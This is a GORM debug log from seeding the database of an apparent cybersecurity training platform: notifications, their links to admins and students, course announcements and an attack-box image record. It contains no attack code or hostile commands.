[0m[33m[9.302ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.441','2025-06-09 14:08:00.441',NULL,1,197) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.772ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.447','2025-06-09 14:08:00.447',NULL,'zACxVxSczgyivlOzNnKN','system','2025-06-09 14:08:00.447',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.421ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.460ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 198 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[9.300ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.457','2025-06-09 14:08:00.457',NULL,1,198) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.170ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.465','2025-06-09 14:08:00.465',NULL,'gdLXkHmAnCAUaqQCrfYM','system','2025-06-09 14:08:00.464',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.422ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.493ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 199 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.486ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.473','2025-06-09 14:08:00.473',NULL,1,199) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.889ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.48','2025-06-09 14:08:00.48',NULL,'RzgLzdrpTLxoRKpeuPhS','system','2025-06-09 14:08:00.48',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.441ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.458ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 200 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[9.385ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.488','2025-06-09 14:08:00.488',NULL,1,200) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.748ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.496','2025-06-09 14:08:00.496',NULL,'vDqKNUkfaMKvoxnTSbxT','system','2025-06-09 14:08:00.496',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.484ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.504ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 201 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.178ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.505','2025-06-09 14:08:00.505',NULL,1,201) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[13.541ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.511','2025-06-09 14:08:00.511',NULL,'aRuAitGFoadxUvRtadzG','system','2025-06-09 14:08:00.511',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.427ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.784ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 202 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[11.285ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.529','2025-06-09 14:08:00.529',NULL,1,202) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.982ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.536','2025-06-09 14:08:00.536',NULL,'HkwokSmLZtkjgsVNwJIb','system','2025-06-09 14:08:00.536',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.432ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.468ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 203 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.026ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.544','2025-06-09 14:08:00.544',NULL,1,203) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.532ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.551','2025-06-09 14:08:00.551',NULL,'lAcDdIpERCXqSRuLTiHV','system','2025-06-09 14:08:00.55',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.425ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.488ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 204 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[12.765ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.559','2025-06-09 14:08:00.559',NULL,1,204) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.010ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.571','2025-06-09 14:08:00.571',NULL,'KWNGSWtnkkxDXtOuEOKa','system','2025-06-09 14:08:00.571',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.410ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.516ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 205 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[7.046ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.578','2025-06-09 14:08:00.578',NULL,1,205) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.714ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.584','2025-06-09 14:08:00.584',NULL,'NVXgLiApvFLewCIiNlMW','system','2025-06-09 14:08:00.584',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.409ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.392ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 206 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[10.182ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.594','2025-06-09 14:08:00.594',NULL,1,206) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.259ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.602','2025-06-09 14:08:00.602',NULL,'OTFgiMNpGEBDsLsYWqRf','system','2025-06-09 14:08:00.602',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.445ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.471ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 207 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[12.006ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.614','2025-06-09 14:08:00.614',NULL,1,207) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.740ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.622','2025-06-09 14:08:00.622',NULL,'JSeWxPLufOAISaHbwoaD','system','2025-06-09 14:08:00.622',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.393ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.482ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 208 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.598ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.629','2025-06-09 14:08:00.629',NULL,1,208) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.576ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.636','2025-06-09 14:08:00.636',NULL,'UhMqewZcfSQTRxsODcoy','system','2025-06-09 14:08:00.636',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.396ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.461ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 209 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[8.640ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.643','2025-06-09 14:08:00.643',NULL,1,209) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.763ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.651','2025-06-09 14:08:00.651',NULL,'HyfOFMhPwTMFTMOalwKF','system','2025-06-09 14:08:00.651',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.410ms] [34;1m[rows:1][0m SELECT * FROM "admins" WHERE "admins"."id" = 1 AND "admins"."deleted_at" IS NULL ORDER BY "admins"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.473ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 210 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationAdminModel.go:29
[0m[33m[12.558ms] [34;1m[rows:1][0m INSERT INTO "notification_admins" ("created_at","updated_at","deleted_at","admin_id","notification_id") VALUES ('2025-06-09 14:08:00.66','2025-06-09 14:08:00.66',NULL,1,210) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.875ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.671','2025-06-09 14:08:00.671',NULL,'New machine ''SQL Injection Basics'' has been added to Web Security course','announcement','2025-06-09 14:08:00.671',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.953ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.510ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 211 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationStudentModel.go:29
[0m[33m[8.756ms] [34;1m[rows:1][0m INSERT INTO "notification_students" ("created_at","updated_at","deleted_at","student_id","notification_id") VALUES ('2025-06-09 14:08:00.679','2025-06-09 14:08:00.679',NULL,1,211) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[11.465ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.69','2025-06-09 14:08:00.69',NULL,'Reminder: Complete the ''Buffer Overflow'' challenge b','reminder','2025-06-09 14:08:00.69',true) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.378ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.441ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 212 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationStudentModel.go:29
[0m[33m[11.573ms] [34;1m[rows:1][0m INSERT INTO "notification_students" ("created_at","updated_at","deleted_at","student_id","notification_id") VALUES ('2025-06-09 14:08:00.7','2025-06-09 14:08:00.7',NULL,1,212) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.943ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.71','2025-06-09 14:08:00.71',NULL,'System maintenance scheduled for Saturday, May 25th from 2-4 AM UTC','system','2025-06-09 14:08:00.709',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.431ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.469ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 213 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationStudentModel.go:29
[0m[33m[7.286ms] [34;1m[rows:1][0m INSERT INTO "notification_students" ("created_at","updated_at","deleted_at","student_id","notification_id") VALUES ('2025-06-09 14:08:00.718','2025-06-09 14:08:00.718',NULL,1,213) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[8.091ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.724','2025-06-09 14:08:00.724',NULL,'Congratulations to the top 3 students on the leaderboard this month!','announcement','2025-06-09 14:08:00.724',true) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.494ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.484ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 214 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationStudentModel.go:29
[0m[33m[9.639ms] [34;1m[rows:1][0m INSERT INTO "notification_students" ("created_at","updated_at","deleted_at","student_id","notification_id") VALUES ('2025-06-09 14:08:00.734','2025-06-09 14:08:00.734',NULL,1,214) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.219ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:08:00.742','2025-06-09 14:08:00.742',NULL,'New course ''Advanced Network Security'' is now available','reminder','2025-06-09 14:08:00.742',false) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.457ms] [34;1m[rows:1][0m SELECT * FROM "students" WHERE "students"."id" = 1 AND "students"."deleted_at" IS NULL ORDER BY "students"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.473ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 215 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationStudentModel.go:29
[0m[33m[10.297ms] [34;1m[rows:1][0m INSERT INTO "notification_students" ("created_at","updated_at","deleted_at","student_id","notification_id") VALUES ('2025-06-09 14:08:00.75','2025-06-09 14:08:00.75',NULL,1,215) RETURNING "id"

2025/06/09 14:08:00 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/HackingMachineModel.go:11
[0m[33m[6.469ms] [34;1m[rows:1][0m INSERT INTO "hacking_machines" ("created_at","updated_at","deleted_at","image_name_or_id") VALUES ('2025-06-09 14:08:00.76','2025-06-09 14:08:00.76',NULL,'mintesnotafework/browser-attackbox:v1.0') RETURNING "id"
